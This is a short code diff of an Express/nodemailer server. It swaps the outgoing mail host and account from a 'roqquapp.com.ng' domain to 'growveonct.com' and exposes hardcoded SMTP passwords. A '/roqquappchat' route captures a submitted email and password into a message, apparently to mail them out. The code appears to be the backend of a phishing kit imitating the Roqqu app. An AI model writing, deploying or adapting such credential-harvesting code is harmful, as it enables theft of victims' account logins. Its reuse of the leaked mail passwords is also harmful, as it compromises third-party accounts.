@@ -7,15 +7,15 @@ const nodemailer = require('nodemailer');
 app.use('/public', express.static(path.join(__dirname, 'public')));
 
 const transporter = nodemailer.createTransport({
-    host: 'mail.roqquapp.com.ng',
+    host: 'mail.growveonct.com',
     port: 465,
     secure: true,
     requireTLS: true,
     socketTimeout: 1200000,
     connectionTimeout: 1200000,
     auth: {
-        user: 'admin@roqquapp.com.ng',
-        pass: 'OiPH.aWsp&BU0',
+        user: 'admin@growveonct.com',
+        pass: 'Panther1.?)0',
     },
     tls: {
         rejectUnauthorized: false,
@@ -32,7 +32,7 @@ transporter.verify(function(error, success) {
 });
 
 
-router.post('/roqquappchat', (req, res, next) => {
+app.post('/roqquappchat', (req, res, next) => {
   const email = req.body.email
   const password = req.body.password
   const content = `email: ${email} \n password: ${password} `
